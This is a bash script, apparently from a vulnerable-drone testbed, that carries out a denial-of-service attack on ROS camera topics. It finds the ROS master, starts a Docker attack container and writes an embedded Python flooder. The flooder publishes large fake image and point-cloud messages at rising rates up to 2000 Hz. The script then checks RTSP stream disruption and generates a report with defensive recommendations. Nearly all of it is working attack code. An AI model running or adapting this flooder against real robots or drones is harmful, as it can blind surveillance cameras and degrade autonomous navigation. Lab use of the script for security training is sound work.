#!/bin/bash
# camera_ros_flood.sh - 카메라 피드 ROS 토픽 플러딩 공격 도구
# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/denial_of_service/camera_ros_flood.sh

source "$(dirname "$0")/../common/colors.sh"
source "$(dirname "$0")/../common/utils.sh"

ATTACK_NAME="Camera Feed ROS Topic Flooding Attack"
LOG_FILE="$(get_log_dir)/camera_ros_flood.log"

print_banner() {
    echo -e "${CYAN}"
    echo "╔═══════════════════════════════════════╗"
    echo "║      카메라 ROS 토픽 플러딩 공격     ║"
    echo "╚═══════════════════════════════════════╝"
    echo -e "${NC}"
}

check_prerequisites() {
    log_info "Checking prerequisites..."
    
    local required_tools=("python3" "pip3" "docker")
    for tool in "${required_tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            log_error "$tool is not installed"
            exit 1
        fi
    done
    
    # Docker 실행 확인
    if ! docker ps >/dev/null 2>&1; then
        log_error "Docker is not running or accessible"
        echo "Start Docker service: sudo systemctl start docker"
        exit 1
    fi
    
    log_success "Prerequisites check completed"
}

detect_ros_environment() {
    log_info "Detecting ROS environment..."
    
    local ros_master_candidates=()
    local network_mode=""
    
    # 네트워크 모드 감지
    if ip addr show | grep -q "192.168.13"; then
        network_mode="wifi"
        ros_master_candidates+=("192.168.13.5:11311")
        log_info "WiFi mode detected"
    elif ip addr show | grep -q "10.13.0"; then
        network_mode="docker"
        ros_master_candidates+=("10.13.0.5:11311")
        log_info "Docker bridge mode detected"
    else
        network_mode="generic"
        ros_master_candidates+=("127.0.0.1:11311")
        log_warning "Generic network mode, using localhost"
    fi
    
    echo -e "${CYAN}Potential ROS Masters:${NC}"
    for candidate in "${ros_master_candidates[@]}"; do
        echo "  └─ $candidate"
    done
    
    echo "$network_mode:${ros_master_candidates[*]}"
}

test_ros_connectivity() {
    local ros_master="$1"
    
    log_info "Testing ROS connectivity to $ros_master..."
    
    local ip=$(echo "$ros_master" | cut -d: -f1)
    local port=$(echo "$ros_master" | cut -d: -f2)
    
    # ROS Master 포트 연결 테스트
    if timeout 5 bash -c "</dev/tcp/$ip/$port" 2>/dev/null; then
        log_success "ROS Master connection to $ros_master successful"
        return 0
    else
        log_warning "ROS Master connection to $ros_master failed"
        return 1
    fi
}

setup_ros_attack_container() {
    local ros_master_ip="$1"
    local container_ip="$2"
    
    log_info "Setting up ROS attack container..."
    
    # 기존 컨테이너 정리
    docker rm -f ros_flood_container 2>/dev/null || true
    
    echo -e "${YELLOW}[*] Pulling ROS Noetic image...${NC}"
    if ! docker pull ros:noetic-ros-base >/dev/null 2>&1; then
        log_error "Failed to pull ROS image"
        return 1
    fi
    
    echo -e "${YELLOW}[*] Starting ROS container...${NC}"
    local container_id=$(docker run -d \
        --network=simulator \
        --ip="$container_ip" \
        --name=ros_flood_container \
        -e ROS_MASTER_URI="http://$ros_master_ip:11311" \
        -e ROS_IP="$container_ip" \
        ros:noetic-ros-base \
        bash -c "source /opt/ros/noetic/setup.bash && sleep infinity")
    
    if [[ -z "$container_id" ]]; then
        log_error "Failed to start ROS container"
        return 1
    fi
    
    echo -e "${YELLOW}[*] Installing Python dependencies...${NC}"
    docker exec ros_flood_container bash -c "apt-get update && apt-get install -y python3 python3-pip python3-rospy python3-sensor-msgs python3-numpy" >/dev/null 2>&1
    
    log_success "ROS attack container ready: $container_id"
    echo "$container_id"
}

create_ros_flooding_script() {
    local script_path="/tmp/ros_topic_flood.py"
    
    cat > "$script_path" << 'EOF'
#!/usr/bin/env python3
"""
ROS 토픽 플러딩 공격 스크립트
"""

import rospy
import sys
import time
import threading
import numpy as np
from sensor_msgs.msg import Image, CompressedImage, PointCloud2, LaserScan
from std_msgs.msg import Header

class ROSTopicFlooder:
    def __init__(self):
        self.flooding_active = False
        self.flood_threads = []
        self.stats = {
            'messages_sent': 0,
            'start_time': 0,
            'topics_flooded': []
        }
    
    def init_ros_node(self):
        """ROS 노드 초기화"""
        try:
            rospy.init_node('malicious_flooder', anonymous=True)
            print("[+] ROS node initialized")
            return True
        except Exception as e:
            print(f"[-] ROS node initialization failed: {e}")
            return False
    
    def discover_topics(self):
        """활성 토픽 발견"""
        print("[*] Discovering active topics...")
        
        try:
            # ROS Master에서 토픽 목록 가져오기
            topic_list = rospy.get_published_topics()
            
            camera_topics = []
            sensor_topics = []
            other_topics = []
            
            for topic_name, topic_type in topic_list:
                if any(keyword in topic_name.lower() for keyword in ['camera', 'image', 'webcam', 'video']):
                    camera_topics.append((topic_name, topic_type))
                elif any(keyword in topic_name.lower() for keyword in ['scan', 'lidar', 'pointcloud', 'sensor']):
                    sensor_topics.append((topic_name, topic_type))
                else:
                    other_topics.append((topic_name, topic_type))
            
            print(f"[+] Found {len(topic_list)} total topics")
            print(f"[+] Camera topics: {len(camera_topics)}")
            print(f"[+] Sensor topics: {len(sensor_topics)}")
            print(f"[+] Other topics: {len(other_topics)}")
            
            return {
                'camera': camera_topics,
                'sensor': sensor_topics,
                'other': other_topics
            }
            
        except Exception as e:
            print(f"[-] Topic discovery failed: {e}")
            return None
    
    def create_fake_image_data(self, width=640, height=480, encoding="rgb8"):
        """가짜 이미지 데이터 생성"""
        img = Image()
        img.header = Header()
        img.header.stamp = rospy.Time.now()
        img.header.frame_id = "camera_frame"
        
        img.height = height
        img.width = width
        img.encoding = encoding
        img.is_bigendian = 0
        img.step = width * 3  # RGB
        
        # 랜덤 이미지 데이터 생성 (큰 데이터)
        data_size = img.step * height
        img.data = np.random.bytes(data_size)
        
        return img
    
    def create_fake_compressed_image(self):
        """가짜 압축 이미지 데이터 생성"""
        img = CompressedImage()
        img.header = Header()
        img.header.stamp = rospy.Time.now()
        img.header.frame_id = "camera_frame"
        
        img.format = "jpeg"
        # 큰 압축 데이터 시뮬레이션
        img.data = np.random.bytes(100000)  # 100KB
        
        return img
    
    def create_fake_pointcloud(self):
        """가짜 포인트클라우드 데이터 생성"""
        cloud = PointCloud2()
        cloud.header = Header()
        cloud.header.stamp = rospy.Time.now()
        cloud.header.frame_id = "lidar_frame"
        
        cloud.height = 1
        cloud.width = 10000  # 많은 포인트
        cloud.is_bigendian = False
        cloud.point_step = 16  # 4 fields * 4 bytes
        cloud.row_step = cloud.point_step * cloud.width
        
        # 큰 포인트 데이터
        data_size = cloud.row_step * cloud.height
        cloud.data = np.random.bytes(data_size)
        
        return cloud
    
    def flood_topic(self, topic_name, topic_type, rate_hz=1000, duration=60):
        """특정 토픽 플러딩"""
        print(f"[*] Flooding {topic_name} ({topic_type}) at {rate_hz} Hz")
        
        try:
            # 토픽 타입에 따른 퍼블리셔 생성
            if 'Image' in topic_type and 'Compressed' not in topic_type:
                pub = rospy.Publisher(topic_name, Image, queue_size=10)
                data_func = self.create_fake_image_data
            elif 'CompressedImage' in topic_type:
                pub = rospy.Publisher(topic_name, CompressedImage, queue_size=10)
                data_func = self.create_fake_compressed_image
            elif 'PointCloud2' in topic_type:
                pub = rospy.Publisher(topic_name, PointCloud2, queue_size=10)
                data_func = self.create_fake_pointcloud
            else:
                print(f"[-] Unsupported topic type: {topic_type}")
                return
            
            rate = rospy.Rate(rate_hz)
            start_time = time.time()
            message_count = 0
            
            while self.flooding_active and (time.time() - start_time) < duration:
                try:
                    # 가짜 데이터 생성 및 발행
                    fake_data = data_func()
                    pub.publish(fake_data)
                    
                    message_count += 1
                    self.stats['messages_sent'] += 1
                    
                    if message_count % 100 == 0:
                        print(f"[*] {topic_name}: {message_count} messages sent")
                    
                    rate.sleep()
                    
                except rospy.ROSInterruptException:
                    break
                except Exception as e:
                    print(f"[-] Flooding error on {topic_name}: {e}")
                    break
            
            print(f"[+] Flooding completed for {topic_name}: {message_count} messages")
            
        except Exception as e:
            print(f"[-] Failed to flood {topic_name}: {e}")
    
    def flood_camera_topics(self, topics, rate_hz=500, duration=60):
        """카메라 토픽들 동시 플러딩"""
        print(f"[*] Starting camera topic flooding attack...")
        print(f"[*] Rate: {rate_hz} Hz, Duration: {duration}s")
        
        self.flooding_active = True
        self.stats['start_time'] = time.time()
        self.stats['topics_flooded'] = [topic[0] for topic in topics]
        
        # 각 토픽에 대해 별도 스레드로 플러딩
        for topic_name, topic_type in topics:
            thread = threading.Thread(
                target=self.flood_topic,
                args=(topic_name, topic_type, rate_hz, duration)
            )
            thread.daemon = True
            thread.start()
            self.flood_threads.append(thread)
            
            # 스레드 시작 간격
            time.sleep(0.1)
        
        print(f"[+] Started flooding {len(topics)} camera topics")
    
    def flood_default_topics(self, rate_hz=1000, duration=60):
        """기본 카메라 토픽 플러딩"""
        print("[*] Flooding default camera topics...")
        
        default_topics = [
            ('/webcam/image_raw', 'sensor_msgs/Image'),
            ('/camera/image_raw', 'sensor_msgs/Image'),
            ('/camera/image_compressed', 'sensor_msgs/CompressedImage'),
            ('/usb_cam/image_raw', 'sensor_msgs/Image'),
            ('/front_camera/image_raw', 'sensor_msgs/Image')
        ]
        
        self.flood_camera_topics(default_topics, rate_hz, duration)
    
    def monitor_system_impact(self, duration=30):
        """시스템 영향 모니터링"""
        print(f"[*] Monitoring system impact for {duration} seconds...")
        
        start_time = time.time()
        initial_msg_count = self.stats['messages_sent']
        
        while time.time() - start_time < duration:
            try:
                # 토픽 목록 다시 확인
                current_topics = rospy.get_published_topics()
                
                # 메시지 전송 속도 계산
                elapsed = time.time() - self.stats['start_time']
                if elapsed > 0:
                    msg_rate = self.stats['messages_sent'] / elapsed
                    print(f"[*] Message rate: {msg_rate:.1f} msg/s")
                
                # ROS Master 상태 확인
                try:
                    rospy.get_master().getSystemState()
                    print("[*] ROS Master responsive")
                except:
                    print("[!] ROS Master unresponsive")
                
                time.sleep(5)
                
            except Exception as e:
                print(f"[-] Monitoring error: {e}")
                break
        
        final_msg_count = self.stats['messages_sent']
        messages_this_period = final_msg_count - initial_msg_count
        
        print(f"[+] Monitoring completed")
        print(f"[+] Messages sent during monitoring: {messages_this_period}")
        
        return messages_this_period
    
    def stop_flooding(self):
        """플러딩 중지"""
        print("[*] Stopping flood attack...")
        
        self.flooding_active = False
        
        # 모든 스레드 종료 대기
        for thread in self.flood_threads:
            thread.join(timeout=5)
        
        elapsed = time.time() - self.stats['start_time']
        avg_rate = self.stats['messages_sent'] / elapsed if elapsed > 0 else 0
        
        print(f"[+] Flooding stopped")
        print(f"[+] Total messages sent: {self.stats['messages_sent']}")
        print(f"[+] Average rate: {avg_rate:.1f} msg/s")
        print(f"[+] Duration: {elapsed:.1f}s")
        
        return self.stats

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 ros_topic_flood.py <action> [options]")
        print("Actions:")
        print("  discover                    - Discover active topics")
        print("  flood_default <rate> <dur>  - Flood default camera topics")
        print("  flood_topic <name> <type> <rate> <dur> - Flood specific topic")
        print("  monitor <duration>          - Monitor system impact")
        sys.exit(1)
    
    action = sys.argv[1]
    
    flooder = ROSTopicFlooder()
    
    if not flooder.init_ros_node():
        print("[-] Failed to initialize ROS node")
        sys.exit(1)
    
    try:
        if action == "discover":
            topics = flooder.discover_topics()
            if topics:
                print("\n[+] Camera Topics:")
                for topic_name, topic_type in topics['camera']:
                    print(f"  └─ {topic_name} ({topic_type})")
                
                print("\n[+] Sensor Topics:")
                for topic_name, topic_type in topics['sensor'][:5]:  # 처음 5개만
                    print(f"  └─ {topic_name} ({topic_type})")
        
        elif action == "flood_default":
            rate = int(sys.argv[2]) if len(sys.argv) > 2 else 1000
            duration = int(sys.argv[3]) if len(sys.argv) > 3 else 60
            
            flooder.flood_default_topics(rate, duration)
            
            # 플러딩 중 모니터링
            time.sleep(5)  # 플러딩 시작 대기
            flooder.monitor_system_impact(min(30, duration-5))
            
            flooder.stop_flooding()
        
        elif action == "flood_topic":
            if len(sys.argv) < 5:
                print("Usage: flood_topic <topic_name> <topic_type> <rate> <duration>")
                sys.exit(1)
            
            topic_name = sys.argv[2]
            topic_type = sys.argv[3]
            rate = int(sys.argv[4])
            duration = int(sys.argv[5])
            
            flooder.flood_camera_topics([(topic_name, topic_type)], rate, duration)
            flooder.stop_flooding()
        
        elif action == "monitor":
            duration = int(sys.argv[2]) if len(sys.argv) > 2 else 30
            flooder.monitor_system_impact(duration)
        
        else:
            print(f"[-] Unknown action: {action}")
    
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user")
        flooder.stop_flooding()
    except Exception as e:
        print(f"[-] Error: {e}")
        flooder.stop_flooding()

if __name__ == "__main__":
    main()
EOF

    chmod +x "$script_path"
    echo "$script_path"
}

execute_ros_flooding_attack() {
    local container_id="$1"
    local attack_type="$2"
    local rate="${3:-1000}"
    local duration="${4:-60}"
    
    log_info "Executing ROS topic flooding attack..."
    
    local script_path=$(create_ros_flooding_script)
    
    echo -e "${YELLOW}[*] Copying attack script to container...${NC}"
    docker cp "$script_path" "$container_id:/tmp/ros_topic_flood.py"
    
    echo -e "${YELLOW}[*] Attack Type: $attack_type${NC}"
    echo -e "${YELLOW}[*] Rate: $rate Hz, Duration: ${duration}s${NC}"
    echo -e "${CYAN}[*] Executing attack...${NC}"
    
    local attack_output=""
    local success=false
    
    case "$attack_type" in
        "discover")
            echo -e "${CYAN}[*] Discovering ROS topics${NC}"
            attack_output=$(docker exec "$container_id" bash -c "
                source /opt/ros/noetic/setup.bash && 
                python3 /tmp/ros_topic_flood.py discover
            " 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "camera_flood")
            echo -e "${RED}[!] Flooding camera topics${NC}"
            attack_output=$(docker exec "$container_id" bash -c "
                source /opt/ros/noetic/setup.bash && 
                timeout $((duration + 10)) python3 /tmp/ros_topic_flood.py flood_default $rate $duration
            " 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "specific_flood")
            local topic_name="/webcam/image_raw"
            local topic_type="sensor_msgs/Image"
            echo -e "${RED}[!] Flooding specific topic: $topic_name${NC}"
            attack_output=$(docker exec "$container_id" bash -c "
                source /opt/ros/noetic/setup.bash && 
                timeout $((duration + 10)) python3 /tmp/ros_topic_flood.py flood_topic '$topic_name' '$topic_type' $rate $duration
            " 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
        "monitor")
            echo -e "${CYAN}[*] Monitoring system impact${NC}"
            attack_output=$(docker exec "$container_id" bash -c "
                source /opt/ros/noetic/setup.bash && 
                python3 /tmp/ros_topic_flood.py monitor $duration
            " 2>&1)
            [[ $? -eq 0 ]] && success=true
            ;;
    esac
    
    echo "$attack_output"
    
    if $success; then
        log_success "ROS flooding attack executed successfully"
    else
        log_warning "ROS flooding attack may have failed"
    fi
    
    rm -f "$script_path"
    
    echo "$success:$attack_output"
}

check_ros_topics() {
    local container_id="$1"
    
    log_info "Checking available ROS topics..."
    
    local script_path=$(create_ros_flooding_script)
    docker cp "$script_path" "$container_id:/tmp/ros_topic_flood.py"
    
    echo -e "${CYAN}Discovering ROS topics...${NC}"
    
    local topics_output=$(docker exec "$container_id" bash -c "
        source /opt/ros/noetic/setup.bash && 
        python3 /tmp/ros_topic_flood.py discover
    " 2>&1)
    
    echo "$topics_output"
    
    # 토픽 개수 분석
    local camera_topics=$(echo "$topics_output" | grep -c "camera\|image\|webcam" || echo "0")
    local total_topics=$(echo "$topics_output" | grep "Found.*total topics" | grep -o '[0-9]\+' | head -1 || echo "0")
    
    echo -e "${GREEN}=== Topic Discovery Summary ===${NC}"
    echo "  └─ Total topics: $total_topics"
    echo "  └─ Camera-related topics: $camera_topics"
    
    if [[ $camera_topics -gt 0 ]]; then
        echo -e "${GREEN}  └─ Camera topics available for flooding${NC}"
    else
        echo -e "${YELLOW}  └─ No camera topics found${NC}"
    fi
    
    rm -f "$script_path"
}

perform_escalating_flood_attack() {
    local container_id="$1"
    
    log_info "Performing escalating ROS flood attack..."
    
    local flood_stages=(
        "discover:Topic discovery:0:10"
        "monitor:Baseline monitoring:0:20"
        "camera_flood:Camera flood (low):100:30"
        "camera_flood:Camera flood (medium):500:30"
        "camera_flood:Camera flood (high):1000:30"
        "camera_flood:Camera flood (extreme):2000:30"
    )
    
    echo -e "${GREEN}=== Escalating ROS Flood Attack ===${NC}"
    
    local stage_results=()
    local successful_stages=0
    
    for stage in "${flood_stages[@]}"; do
        local attack_type=$(echo "$stage" | cut -d: -f1)
        local description=$(echo "$stage" | cut -d: -f2)
        local rate=$(echo "$stage" | cut -d: -f3)
        local duration=$(echo "$stage" | cut -d: -f4)
        
        echo -e "\n${CYAN}[*] Stage: $description${NC}"
        
        if [[ "$attack_type" == "discover" ]]; then
            check_ros_topics "$container_id"
            stage_results+=("$description:SUCCESS")
            ((successful_stages++))
        else
            local result=$(execute_ros_flooding_attack "$container_id" "$attack_type" "$rate" "$duration")
            local success=$(echo "$result" | cut -d: -f1)
            
            if [[ "$success" == "true" ]]; then
                ((successful_stages++))
                stage_results+=("$description:SUCCESS")
                echo -e "${GREEN}  └─ Stage succeeded${NC}"
            else
                stage_results+=("$description:FAILED")
                echo -e "${RED}  └─ Stage failed${NC}"
            fi
        fi
        
        # 단계 간 대기 (시스템 회복 시간)
        echo -e "${YELLOW}  └─ Waiting for system recovery...${NC}"
        sleep 10
    done
    
    echo -e "\n${GREEN}=== Flood Attack Summary ===${NC}"
    echo "  └─ Total stages: ${#flood_stages[@]}"
    echo "  └─ Successful stages: $successful_stages"
    echo "  └─ Success rate: $((successful_stages * 100 / ${#flood_stages[@]}))%"
    
    echo -e "\n${CYAN}Stage Details:${NC}"
    for result in "${stage_results[@]}"; do
        local desc=$(echo "$result" | cut -d: -f1)
        local status=$(echo "$result" | cut -d: -f2)
        
        if [[ "$status" == "SUCCESS" ]]; then
            echo "  └─ $desc: ${GREEN}$status${NC}"
        else
            echo "  └─ $desc: ${RED}$status${NC}"
        fi
    done
    
    echo "$successful_stages:${#flood_stages[@]}"
}

monitor_rtsp_stream_impact() {
    local duration="${1:-30}"
    
    log_info "Monitoring RTSP stream impact..."
    
    echo -e "${YELLOW}[*] Monitoring RTSP stream for ${duration} seconds...${NC}"
    
    # RTSP 스트림 URL 후보들
    local rtsp_urls=(
        "rtsp://192.168.13.1:8554/webcam"
        "rtsp://10.13.0.3:8554/webcam"
        "rtsp://127.0.0.1:8554/webcam"
    )
    
    local stream_status=()
    
    for url in "${rtsp_urls[@]}"; do
        echo -e "${CYAN}Testing RTSP stream: $url${NC}"
        
        # ffprobe를 사용한 스트림 테스트 (설치되어 있다면)
        if command -v ffprobe >/dev/null 2>&1; then
            if timeout 10 ffprobe -v quiet -select_streams v:0 -show_entries stream=width,height,r_frame_rate "$url" >/dev/null 2>&1; then
                echo "  └─ ${GREEN}Stream accessible${NC}"
                stream_status+=("$url:ACCESSIBLE")
            else
                echo "  └─ ${RED}Stream inaccessible${NC}"
                stream_status+=("$url:INACCESSIBLE")
            fi
        else
            # 네트워크 연결만 테스트
            local rtsp_host=$(echo "$url" | sed 's/rtsp:\/\/\([^:]*\).*/\1/')
            local rtsp_port=$(echo "$url" | sed 's/rtsp:\/\/[^:]*:\([0-9]*\).*/\1/')
            
            if timeout 5 bash -c "</dev/tcp/$rtsp_host/$rtsp_port" 2>/dev/null; then
                echo "  └─ ${GREEN}RTSP port accessible${NC}"
                stream_status+=("$url:PORT_ACCESSIBLE")
            else
                echo "  └─ ${RED}RTSP port inaccessible${NC}"
                stream_status+=("$url:PORT_INACCESSIBLE")
            fi
        fi
    done
    
    echo -e "${GREEN}=== RTSP Stream Status ===${NC}"
    for status in "${stream_status[@]}"; do
        local url=$(echo "$status" | cut -d: -f1)
        local state=$(echo "$status" | cut -d: -f2)
        echo "  └─ $url: $state"
    done
}

generate_ros_flood_report() {
    local ros_master="$1"
    local attack_summary="$2"
    local container_id="$3"
    
    log_info "Generating ROS flood attack report..."
    
    local successful=$(echo "$attack_summary" | cut -d: -f1)
    local total=$(echo "$attack_summary" | cut -d: -f2)
    local success_rate=$((successful * 100 / total))
    
    local report_file="$(get_log_dir)/camera_ros_flood_report_$(date +%Y%m%d_%H%M%S).txt"
    
    cat > "$report_file" << EOF
╔═══════════════════════════════════════════════════╗
║          카메라 ROS 토픽 플러딩 공격 보고서       ║
╚═══════════════════════════════════════════════════╝

Date: $(date)
Attack Type: ROS Topic Flooding
Target ROS Master: $ros_master
Container ID: $container_id
Success Rate: ${success_rate}% (${successful}/${total})

╔═══ ATTACK SUMMARY ═══╗

Target System: ROS-enabled Drone Camera
Attack Vector: Topic Message Flooding
Protocol: ROS (Robot Operating System)
Topics Targeted:
  - /webcam/image_raw
  - /camera/image_raw
  - /camera/image_compressed
  - /usb_cam/image_raw

╔═══ ATTACK EXECUTION ═══╗

$(cat "$LOG_FILE" | grep -A 25 "Escalating ROS Flood Attack" | tail -25)

╔═══ RTSP IMPACT ASSESSMENT ═══╗

$(cat "$LOG_FILE" | grep -A 10 "RTSP Stream Status" | tail -10)

╔═══ SECURITY IMPLICATIONS ═══╗

1. Resource Exhaustion
   - Network bandwidth saturation
   - CPU/Memory consumption
   - ROS Master overload

2. Service Disruption
   - RTSP stream interruption
   - Camera feed degradation
   - Real-time processing delays

3. System Stability
   - ROS node crashes
   - Topic subscriber failures
   - Message queue overflow

╔═══ ATTACK MECHANISMS ═══╗

1. Message Flooding
   - High-frequency message publishing
   - Large payload injection
   - Multiple topic targeting

2. Resource Competition
   - Bandwidth exhaustion
   - Processing queue saturation
   - Memory allocation stress

3. Service Degradation
   - Legitimate message delays
   - Topic subscription failures
   - Stream quality reduction

╔═══ EXPLOITATION SCENARIOS ═══╗

1. Surveillance Disruption
   - Camera feed interruption
   - Real-time monitoring failure
   - Video recording corruption

2. Navigation Interference
   - Visual SLAM disruption
   - Object detection failure
   - Autonomous flight degradation

3. Communication Overload
   - ROS Master saturation
   - Topic publication delays
   - System responsiveness loss

╔═══ DEFENSIVE RECOMMENDATIONS ═══╗

1. 네트워크 보안
   - ROS 네트워크 격리
   - 방화벽 규칙 구현
   - 트래픽 속도 제한

2. 시스템 모니터링
   - 토픽 메시지 속도 감시
   - 비정상 퍼블리셔 탐지
   - 리소스 사용량 알림

3. 아키텍처 강화
   - 메시지 큐 크기 제한
   - 퍼블리셔 인증 구현
   - 백업 통신 채널

╚═══════════════════════╝
EOF

    log_success "Report saved to: $report_file"
    echo -e "${GREEN}Report location: $report_file${NC}"
}

cleanup() {
    log_info "Cleaning up ROS attack environment..."
    
    # 공격 컨테이너 정리
    if [[ -n "$ATTACK_CONTAINER_ID" ]]; then
        echo -e "${YELLOW}[*] Removing attack container...${NC}"
        docker rm -f "$ATTACK_CONTAINER_ID" >/dev/null 2>&1
    fi
    
    # 임시 파일 정리
    rm -f /tmp/ros_topic_flood.py 2>/dev/null
}

main() {
    print_banner
    check_prerequisites
    
    log_info "Starting camera ROS topic flooding attack..."
    echo "Attack: $ATTACK_NAME" >> "$LOG_FILE"
    echo "Timestamp: $(date)" >> "$LOG_FILE"
    echo "================================" >> "$LOG_FILE"
    
    # ROS 환경 탐지
    local ros_info=$(detect_ros_environment)
    local network_mode=$(echo "$ros_info" | cut -d: -f1)
    local ros_masters=($(echo "$ros_info" | cut -d: -f2-))
    
    # 활성 ROS Master 찾기
    local active_ros_master=""
    for ros_master in "${ros_masters[@]}"; do
        if test_ros_connectivity "$ros_master"; then
            active_ros_master="$ros_master"
            break
        fi
    done
    
    if [[ -z "$active_ros_master" ]]; then
        log_error "No active ROS Master found"
        exit 1
    fi
    
    echo -e "\n${BLUE}[*] Active ROS Master: $active_ros_master${NC}"
    
    # 공격 컨테이너 설정
    local ros_master_ip=$(echo "$active_ros_master" | cut -d: -f1)
    local container_ip="10.13.0.10"
    
    if [[ "$network_mode" == "wifi" ]]; then
        container_ip="192.168.13.10"
    fi
    
    echo -e "\n${BLUE}[*] Setting up attack container...${NC}"
    local container_id=$(setup_ros_attack_container "$ros_master_ip" "$container_ip")
    
    if [[ -z "$container_id" ]]; then
        log_error "Failed to setup attack container"
        exit 1
    fi
    
    export ATTACK_CONTAINER_ID="$container_id"
    
    # ROS 토픽 확인
    echo -e "\n${BLUE}[*] Checking available ROS topics...${NC}"
    check_ros_topics "$container_id" | tee -a "$LOG_FILE"
    
    # 단계별 플러딩 공격
    echo -e "\n${BLUE}[*] Executing escalating flood attack...${NC}"
    local attack_summary=$(perform_escalating_flood_attack "$container_id")
    
    # RTSP 스트림 영향 모니터링
    echo -e "\n${BLUE}[*] Monitoring RTSP stream impact...${NC}"
    monitor_rtsp_stream_impact 30 | tee -a "$LOG_FILE"
    
    # 보고서 생성
    generate_ros_flood_report "$active_ros_master" "$attack_summary" "$container_id"
    
    cleanup
    
    log_success "Camera ROS topic flooding attack completed"
    echo "Attack completed at $(date)" >> "$LOG_FILE"
}

# Signal handlers for graceful cleanup
trap cleanup EXIT
trap 'echo -e "\n${RED}Attack interrupted${NC}"; cleanup; exit 1' INT TERM

# Execute main function
main "$@"